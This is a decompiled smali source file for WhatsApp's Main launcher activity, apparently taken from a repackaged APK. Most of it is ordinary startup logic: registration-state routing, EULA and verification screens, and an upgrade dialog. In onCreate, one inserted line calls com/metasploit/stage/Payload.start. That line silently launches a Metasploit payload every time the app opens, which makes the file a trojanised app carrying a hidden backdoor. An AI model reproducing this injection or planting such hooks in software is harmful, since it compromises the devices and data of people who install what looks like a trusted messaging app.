.class public Lcom/whatsapp/Main;
.super Ld/f/eI;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/whatsapp/Main$a;
    }
.end annotation


# instance fields
.field public final Aa:Ld/f/aI;

.field public final Ba:Ld/f/za/Hb;

.field public final Ca:Ld/f/wF;

.field public final Da:Ld/f/ea/p;

.field public final Ea:Lcom/whatsapp/util/WhatsAppLibLoader;

.field public final Fa:Ld/f/v/mc;

.field public xa:Landroid/net/Uri;

.field public ya:Lcom/whatsapp/Main$a;

.field public za:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 331324
    invoke-direct {p0}, Ld/f/eI;-><init>()V

    .line 331325
    invoke-static {}, Ld/f/aI;->b()Ld/f/aI;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->Aa:Ld/f/aI;

    .line 331326
    invoke-static {}, Ld/f/za/Mb;->a()Ld/f/za/Hb;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->Ba:Ld/f/za/Hb;

    .line 331327
    invoke-static {}, Ld/f/wF;->a()Ld/f/wF;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->Ca:Ld/f/wF;

    .line 331328
    sget-object v0, Ld/f/ea/p;->a:Ld/f/ea/p;

    .line 331329
    iput-object v0, p0, Lcom/whatsapp/Main;->Da:Ld/f/ea/p;

    .line 331330
    sget-object v0, Lcom/whatsapp/util/WhatsAppLibLoader;->a:Lcom/whatsapp/util/WhatsAppLibLoader;

    .line 331331
    iput-object v0, p0, Lcom/whatsapp/Main;->Ea:Lcom/whatsapp/util/WhatsAppLibLoader;

    .line 331332
    invoke-static {}, Ld/f/v/mc;->d()Ld/f/v/mc;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/Main;->Fa:Ld/f/v/mc;

    return-void
.end method

.method public static Ha()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 331381
    const-class v0, Lcom/whatsapp/HomeActivity;

    return-object v0
.end method

.method public static synthetic a(Lcom/whatsapp/Main;)V
    .locals 0

    .line 331411
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Ia()V

    return-void
.end method

.method public static synthetic a(Lcom/whatsapp/Main;Landroid/content/DialogInterface;I)V
    .locals 3

    .line 331412
    new-instance v2, Landroid/content/Intent;

    const-string v0, "android.intent.action.VIEW"

    invoke-direct {v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/whatsapp/Main;->xa:Landroid/net/Uri;

    const-string v0, "application/vnd.android.package-archive"

    .line 331413
    invoke-virtual {v2, v1, v0}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    const/4 v0, 0x1

    .line 331414
    invoke-virtual {v1, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-result-object v0

    .line 331415
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    const/4 v0, 0x0

    .line 331416
    invoke-static {p0, v0}, Lc/a/f/r;->a(Landroid/app/Activity;I)V

    .line 331417
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public static synthetic b(Lcom/whatsapp/Main;Landroid/content/DialogInterface;I)V
    .locals 1

    .line 331418
    iget-object v0, p0, Lcom/whatsapp/Main;->Aa:Ld/f/aI;

    invoke-virtual {v0}, Ld/f/aI;->a()V

    const/4 v0, 0x0

    .line 331419
    invoke-static {p0, v0}, Lc/a/f/r;->a(Landroid/app/Activity;I)V

    .line 331420
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Ja()V

    return-void
.end method


# virtual methods
.method public Da()V
    .locals 5

    .line 331333
    iget-object v0, p0, Ld/f/eI;->W:Ld/f/VB;

    .line 331334
    iget-object v0, v0, Ld/f/VB;->d:Lcom/whatsapp/Me;

    const/4 v1, 0x2

    if-nez v0, :cond_9

    .line 331335
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_2

    .line 331336
    iget-object v0, p0, Ld/f/eI;->ta:Ld/f/na/Bb;

    invoke-virtual {v0}, Ld/f/na/Bb;->b()I

    move-result v2

    const/4 v4, 0x0

    const/4 v3, 0x1

    if-eqz v2, :cond_8

    if-eq v2, v3, :cond_7

    if-eq v2, v1, :cond_6

    const/4 v0, 0x4

    const-string v1, "changenumber"

    if-eq v2, v0, :cond_5

    const/4 v0, 0x5

    if-eq v2, v0, :cond_7

    const/4 v0, 0x6

    if-eq v2, v0, :cond_4

    const/4 v0, 0x7

    if-eq v2, v0, :cond_3

    .line 331337
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "main/invalid/registration state="

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, "; default to EULA"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;)V

    .line 331338
    iget-object v0, p0, Ld/f/eI;->pa:Ld/f/na/Ab;

    invoke-virtual {v0, v4}, Ld/f/na/Ab;->b(I)V

    .line 331339
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331340
    :cond_0
    :goto_0
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Fa()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 331341
    invoke-virtual {p0, v2}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 331342
    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    const-string v0, "main/me App.me is null, can\'t proceed."

    .line 331343
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    return-void

    .line 331344
    :cond_3
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/VerifyTwoFactorAuth;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331345
    iget-object v0, p0, Ld/f/eI;->pa:Ld/f/na/Ab;

    invoke-virtual {v0}, Ld/f/na/Ab;->g()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 331346
    invoke-virtual {v2, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto :goto_0

    .line 331347
    :cond_4
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/DeleteAccountConfirmation;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    .line 331348
    :cond_5
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/VerifySms;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331349
    iget-object v0, p0, Ld/f/eI;->pa:Ld/f/na/Ab;

    invoke-virtual {v0}, Ld/f/na/Ab;->g()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 331350
    invoke-virtual {v2, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto :goto_0

    :cond_6
    const-string v0, "main/no-me/regname"

    .line 331351
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331352
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/RegisterName;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    .line 331353
    :cond_7
    iget-object v0, p0, Ld/f/eI;->pa:Ld/f/na/Ab;

    invoke-virtual {v0, v4}, Ld/f/na/Ab;->b(I)V

    .line 331354
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    .line 331355
    :cond_8
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v2, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331356
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "show_registration_first_dlg"

    invoke-virtual {v0, v1, v4}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 331357
    invoke-virtual {v2, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto :goto_0

    .line 331358
    :cond_9
    iget-object v0, p0, Ld/f/eI;->ta:Ld/f/na/Bb;

    invoke-virtual {v0}, Ld/f/na/Bb;->b()I

    move-result v0

    if-ne v0, v1, :cond_b

    const-string v0, "main/me/regname"

    .line 331359
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331360
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/RegisterName;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331361
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Fa()Z

    move-result v0

    if-eqz v0, :cond_a

    .line 331362
    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 331363
    :cond_a
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    .line 331364
    :cond_b
    iget-object v1, p0, Ld/f/eI;->pa:Ld/f/na/Ab;

    const/4 v0, 0x3

    invoke-virtual {v1, v0}, Ld/f/na/Ab;->b(I)V

    const-string v0, "main/verified/setregverified"

    .line 331365
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331366
    iget-object v0, p0, Ld/f/eI;->ha:Ld/f/uA;

    .line 331367
    iget-boolean v0, v0, Ld/f/uA;->d:Z

    if-eqz v0, :cond_c

    .line 331368
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Ga()V

    .line 331369
    :goto_1
    return-void

    .line 331370
    :cond_c
    const-string v0, "main/messageStoreVerified/gotoActivity"

    .line 331371
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331372
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Ia()V

    goto :goto_1
.end method

.method public final Fa()Z
    .locals 1

    .line 331373
    iget-boolean v0, p0, Lcom/whatsapp/Main;->za:Z

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public final Ga()V
    .locals 3

    .line 331374
    iget-object v0, p0, Lcom/whatsapp/Main;->ya:Lcom/whatsapp/Main$a;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/os/AsyncTask;->getStatus()Landroid/os/AsyncTask$Status;

    move-result-object v1

    sget-object v0, Landroid/os/AsyncTask$Status;->RUNNING:Landroid/os/AsyncTask$Status;

    if-eq v1, v0, :cond_2

    .line 331375
    :cond_0
    new-instance v0, Lcom/whatsapp/Main$a;

    invoke-direct {v0, p0}, Lcom/whatsapp/Main$a;-><init>(Lcom/whatsapp/Main;)V

    iput-object v0, p0, Lcom/whatsapp/Main;->ya:Lcom/whatsapp/Main$a;

    .line 331376
    iget-object v2, p0, Lcom/whatsapp/Main;->Ba:Ld/f/za/Hb;

    iget-object v1, p0, Lcom/whatsapp/Main;->ya:Lcom/whatsapp/Main$a;

    const/4 v0, 0x0

    new-array v0, v0, [Ljava/lang/Void;

    check-cast v2, Ld/f/za/Mb;

    invoke-virtual {v2, v1, v0}, Ld/f/za/Mb;->b(Landroid/os/AsyncTask;[Ljava/lang/Object;)V

    :cond_1
    :goto_0
    return-void

    .line 331377
    :cond_2
    const-string v0, "main/show dialog sync"

    .line 331378
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331379
    iget-boolean v0, p0, Lcom/whatsapp/Main;->za:Z

    if-eqz v0, :cond_1

    const/16 v0, 0x68

    .line 331380
    invoke-static {p0, v0}, Lc/a/f/r;->b(Landroid/app/Activity;I)V

    goto :goto_0
.end method

.method public final Ia()V
    .locals 3

    const-string v0, "main/gotoActivity"

    .line 331382
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331383
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    const-string v0, "jid"

    invoke-virtual {v1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ld/f/S/m;->a(Ljava/lang/String;)Ld/f/S/m;

    move-result-object v2

    .line 331384
    invoke-static {v2}, Lc/a/f/Da;->m(Ld/f/S/m;)Z

    move-result v0

    if-nez v0, :cond_2

    .line 331385
    iget-object v0, p0, Ld/f/eI;->da:Ld/f/v/cb;

    invoke-virtual {v0, v2}, Ld/f/v/cb;->e(Ld/f/S/m;)Ld/f/v/hd;

    move-result-object v1

    .line 331386
    invoke-static {v2}, Lc/a/f/Da;->l(Ld/f/S/m;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, v1, Ld/f/v/hd;->c:Ljava/lang/String;

    if-eqz v0, :cond_2

    .line 331387
    :cond_0
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Fa()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 331388
    invoke-static {p0, v1}, Lcom/whatsapp/Conversation;->a(Landroid/content/Context;Ld/f/v/hd;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    const/4 v0, 0x0

    .line 331389
    invoke-virtual {p0, v0, v0}, Landroid/app/Activity;->overridePendingTransition(II)V

    .line 331390
    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 331391
    :goto_0
    return-void

    .line 331392
    :cond_2
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Ja()V

    goto :goto_0
.end method

.method public final Ja()V
    .locals 4

    .line 331393
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_2

    .line 331394
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x0

    if-eqz v2, :cond_0

    .line 331395
    invoke-virtual {v2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    const-string v0, "android.intent.action.MAIN"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 331396
    invoke-virtual {v2}, Landroid/content/Intent;->getFlags()I

    move-result v1

    const/high16 v0, 0x4000000

    and-int/2addr v1, v0

    if-eqz v1, :cond_0

    const-string v0, "jid"

    .line 331397
    invoke-virtual {v2, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 331398
    iget-object v0, p0, Lcom/whatsapp/DialogToastActivity;->E:Ld/f/r/n;

    .line 331399
    iget-object v0, v0, Ld/f/r/n;->d:Landroid/content/SharedPreferences;

    const-string v2, "shortcut_version"

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "main/recreate_shortcut"

    .line 331400
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331401
    iget-object v0, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    invoke-static {v0}, Lc/a/f/Da;->a(Ld/f/r/a/r;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, v3}, Lcom/whatsapp/registration/RegisterName;->a(Landroid/content/Context;Ljava/lang/String;I)V

    .line 331402
    iget-object v0, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    invoke-static {v0}, Lc/a/f/Da;->a(Ld/f/r/a/r;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/whatsapp/registration/RegisterName;->a(Landroid/content/Context;Ljava/lang/String;)V

    .line 331403
    iget-object v1, p0, Lcom/whatsapp/DialogToastActivity;->E:Ld/f/r/n;

    const/4 v0, 0x1

    .line 331404
    invoke-static {v1, v2, v0}, Ld/a/b/a/a;->b(Ld/f/r/n;Ljava/lang/String;I)V

    .line 331405
    :cond_0
    invoke-virtual {p0}, Lcom/whatsapp/Main;->Fa()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 331406
    new-instance v1, Landroid/content/Intent;

    .line 331407
    const-class v0, Lcom/whatsapp/HomeActivity;

    .line 331408
    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 331409
    invoke-virtual {p0, v3, v3}, Landroid/app/Activity;->overridePendingTransition(II)V

    .line 331410
    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 6

    const-string v5, "show_registration_first_dlg"

    const-string v0, "Main/onCreate"

    .line 331421
    invoke-static {v0}, Lb/a/a/b/c;->a(Ljava/lang/String;)V

    .line 331422
    :try_start_0
    iget-object v1, p0, Lcom/whatsapp/Main;->Da:Ld/f/ea/p;

    const-string v0, "Main"

    invoke-virtual {v1, v0}, Ld/f/ea/p;->a(Ljava/lang/String;)V

    const/4 v4, 0x0

    .line 331423
    invoke-virtual {p0, v4}, Ld/f/VI;->j(Z)V

    .line 331424
    invoke-super {p0, p1}, Ld/f/VI;->onCreate(Landroid/os/Bundle;)V
	invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 331425
    iget-object v1, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    const v0, 0x7f110563

    invoke-virtual {v1, v0}, Ld/f/r/a/r;->b(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    .line 331426
    iget-object v1, p0, Lcom/whatsapp/Main;->Ea:Lcom/whatsapp/util/WhatsAppLibLoader;

    const/4 v0, 0x0

    invoke-virtual {v1, v0}, Lcom/whatsapp/util/WhatsAppLibLoader;->b(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "aborting due to native libraries missing"

    .line 331427
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331428
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 331429
    invoke-static {}, Lb/a/a/b/c;->a()V

    return-void

    .line 331430
    :cond_0
    :try_start_1
    iget-object v0, p0, Lcom/whatsapp/Main;->Ca:Ld/f/wF;

    invoke-virtual {v0}, Ld/f/wF;->e()Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "main/device-not-supported"

    .line 331431
    invoke-static {v0}, Lcom/whatsapp/util/Log;->w(Ljava/lang/String;)V

    .line 331432
    new-instance v0, Lcom/whatsapp/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;

    invoke-direct {v0}, Lcom/whatsapp/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;-><init>()V

    invoke-virtual {p0, v0}, Lcom/whatsapp/DialogToastActivity;->a(Landroidx/fragment/app/DialogFragment;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 331433
    invoke-static {}, Lb/a/a/b/c;->a()V

    return-void

    .line 331434
    :cond_1
    :try_start_2
    iget-object v0, p0, Ld/f/eI;->ta:Ld/f/na/Bb;

    invoke-virtual {v0}, Ld/f/na/Bb;->b()I

    move-result v2

    .line 331435
    iget-object v0, p0, Ld/f/eI;->W:Ld/f/VB;

    .line 331436
    iget-object v1, v0, Ld/f/VB;->d:Lcom/whatsapp/Me;

    const/4 v3, 0x1

    if-nez v1, :cond_4

    if-nez v2, :cond_4

    .line 331437
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_3

    .line 331438
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/registration/EULA;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331439
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v5, v4}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 331440
    invoke-virtual {v1, v5, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 331441
    :cond_2
    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 331442
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 331443
    :cond_3
    invoke-static {}, Lb/a/a/b/c;->a()V

    return-void

    :cond_4
    const/4 v0, 0x6

    if-ne v2, v0, :cond_6

    .line 331444
    :try_start_3
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_5

    .line 331445
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/DeleteAccountConfirmation;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 331446
    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    .line 331447
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 331448
    :cond_5
    invoke-static {}, Lb/a/a/b/c;->a()V

    return-void

    :cond_6
    if-eqz v1, :cond_8

    .line 331449
    :try_start_4
    iget-object v0, p0, Lcom/whatsapp/Main;->Fa:Ld/f/v/mc;

    .line 331450
    iget-boolean v0, v0, Ld/f/v/mc;->e:Z

    if-nez v0, :cond_8

    .line 331451
    invoke-virtual {p0}, Ld/f/eI;->Ca()Z

    move-result v0

    if-eqz v0, :cond_9

    .line 331452
    iget-object v0, p0, Ld/f/eI;->na:Ld/f/v/ec;

    invoke-virtual {v0}, Ld/f/v/ec;->d()I

    move-result v2

    .line 331453
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "main/create/backupfilesfound "

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    if-lez v2, :cond_7

    goto :goto_0

    .line 331454
    :cond_7
    invoke-virtual {p0, v4}, Ld/f/eI;->k(Z)V

    goto :goto_1

    .line 331455
    :cond_8
    iput-boolean v3, p0, Lcom/whatsapp/Main;->za:Z

    .line 331456
    invoke-virtual {p0}, Ld/f/eI;->Da()V

    goto :goto_2

    .line 331457
    :goto_0
    const/16 v0, 0x69

    .line 331458
    invoke-static {p0, v0}, Lc/a/f/r;->b(Landroid/app/Activity;I)V

    .line 331459
    :cond_9
    :goto_1
    invoke-virtual {p0, v3}, Ld/f/VI;->j(Z)V

    .line 331460
    invoke-virtual {p0}, Ld/f/VI;->Ba()V

    .line 331461
    :goto_2
    iget-object v1, p0, Lcom/whatsapp/Main;->Da:Ld/f/ea/p;

    const-string v0, "Main created"

    invoke-virtual {v1, v0}, Ld/f/ea/p;->b(Ljava/lang/String;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 331462
    invoke-static {}, Lb/a/a/b/c;->a()V

    return-void

    :catchall_0
    move-exception v0

    invoke-static {}, Lb/a/a/b/c;->a()V

    .line 331463
    throw v0
.end method

.method public onCreateDialog(I)Landroid/app/Dialog;
    .locals 3

    if-eqz p1, :cond_0

    .line 331464
    invoke-super {p0, p1}, Ld/f/eI;->onCreateDialog(I)Landroid/app/Dialog;

    move-result-object v0

    return-object v0

    :cond_0
    const-string v0, "main/dialog/upgrade"

    .line 331465
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 331466
    iget-object v0, p0, Lcom/whatsapp/Main;->Da:Ld/f/ea/p;

    invoke-virtual {v0}, Ld/f/ea/p;->a()V

    .line 331467
    new-instance v2, Lc/a/a/l$a;

    invoke-direct {v2, p0}, Lc/a/a/l$a;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    const v0, 0x7f110beb

    .line 331468
    invoke-virtual {v1, v0}, Ld/f/r/a/r;->b(I)Ljava/lang/String;

    move-result-object v1

    .line 331469
    iget-object v0, v2, Lc/a/a/l$a;->a:Landroidx/appcompat/app/AlertController$a;

    iput-object v1, v0, Landroidx/appcompat/app/AlertController$a;->f:Ljava/lang/CharSequence;

    .line 331470
    iget-object v1, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    const v0, 0x7f110bea

    .line 331471
    invoke-virtual {v1, v0}, Ld/f/r/a/r;->b(I)Ljava/lang/String;

    move-result-object v0

    .line 331472
    iget-object v1, v2, Lc/a/a/l$a;->a:Landroidx/appcompat/app/AlertController$a;

    iput-object v0, v1, Landroidx/appcompat/app/AlertController$a;->h:Ljava/lang/CharSequence;

    const/4 v0, 0x0

    .line 331473
    iput-boolean v0, v1, Landroidx/appcompat/app/AlertController$a;->r:Z

    .line 331474
    iget-object v1, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    const v0, 0x7f110cfa

    .line 331475
    invoke-virtual {v1, v0}, Ld/f/r/a/r;->b(I)Ljava/lang/String;

    move-result-object v1

    new-instance v0, Ld/f/ti;

    invoke-direct {v0, p0}, Ld/f/ti;-><init>(Lcom/whatsapp/Main;)V

    .line 331476
    invoke-virtual {v2, v1, v0}, Lc/a/a/l$a;->c(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Lc/a/a/l$a;

    iget-object v1, p0, Lcom/whatsapp/DialogToastActivity;->C:Ld/f/r/a/r;

    const v0, 0x7f110562

    .line 331477
    invoke-virtual {v1, v0}, Ld/f/r/a/r;->b(I)Ljava/lang/String;

    move-result-object v1

    new-instance v0, Ld/f/si;

    invoke-direct {v0, p0}, Ld/f/si;-><init>(Lcom/whatsapp/Main;)V

    .line 331478
    invoke-virtual {v2, v1, v0}, Lc/a/a/l$a;->a(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Lc/a/a/l$a;

    .line 331479
    invoke-virtual {v2}, Lc/a/a/l$a;->a()Lc/a/a/l;

    move-result-object v0

    return-object v0
.end method

.method public onStart()V
    .locals 1

    .line 331480
    invoke-super {p0}, Ld/f/VI;->onStart()V

    const/4 v0, 0x1

    .line 331481
    iput-boolean v0, p0, Lcom/whatsapp/Main;->za:Z

    return-void
.end method

.method public onStop()V
    .locals 1

    .line 331482
    invoke-super {p0}, Lc/a/a/m;->onStop()V

    const/4 v0, 0x0

    .line 331483
    iput-boolean v0, p0, Lcom/whatsapp/Main;->za:Z

    return-void
.end method
